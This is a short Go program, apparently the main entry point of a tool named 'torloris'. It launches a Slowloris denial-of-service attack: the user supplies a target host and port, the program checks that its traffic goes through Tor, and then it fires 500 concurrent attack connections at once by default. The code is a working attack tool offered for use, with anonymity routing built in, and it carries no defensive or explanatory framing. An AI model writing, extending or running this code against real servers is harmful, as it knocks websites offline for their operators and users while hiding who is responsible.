package main

import (
	"fmt"
	"os"
	"flag"
	"os/signal"
	"syscall"

	"github.com/tacusci/logging"
	"github.com/tauraamui/torloris/slowloris"
)

type options struct {
	target string
	port string
	connections int
}

func main() {

	opts := options{}
	
	flag.StringVar(&opts.target, "target", "", "address of target endpoint")
	flag.StringVar(&opts.port, "port", "80", "http port to use")
	flag.IntVar(&opts.connections, "connections", 500, "number of concurrent connections")
	flag.Parse()

	client, err := slowloris.NewClient()

	if err != nil {
		logging.ErrorAndExit(err.Error())
	}

	go listenForStopSig(client)

	logging.InfoNnlNoColor("Checking connected via Tor service... ")
	if client.CheckTorConnection() {
		logging.GreenOutput("Connected!\n")
	} else {
		logging.RedOutput("Not connected!\n")
	}

	client.Running = true

	//force all connections to start sending at exact same time
	start := make(chan struct{})

	for i := 0; i < opts.connections; i++ {
		go client.Attack(&start, fmt.Sprintf("%s:%s", opts.target, opts.port))
	}

	close(start)

	for client.Running { client.Stop <- false }
	client.Stop <- true
}

func listenForStopSig(client *slowloris.Client) {
	var gracefulStop = make(chan os.Signal)
	signal.Notify(gracefulStop, syscall.SIGTERM)
	signal.Notify(gracefulStop, syscall.SIGINT)
	sig := <-gracefulStop
	client.Close()
	logging.Error(fmt.Sprintf("☠️  Caught sig: %+v (Shutting down and cleaning up...) ☠️", sig))
	os.Exit(0)
}
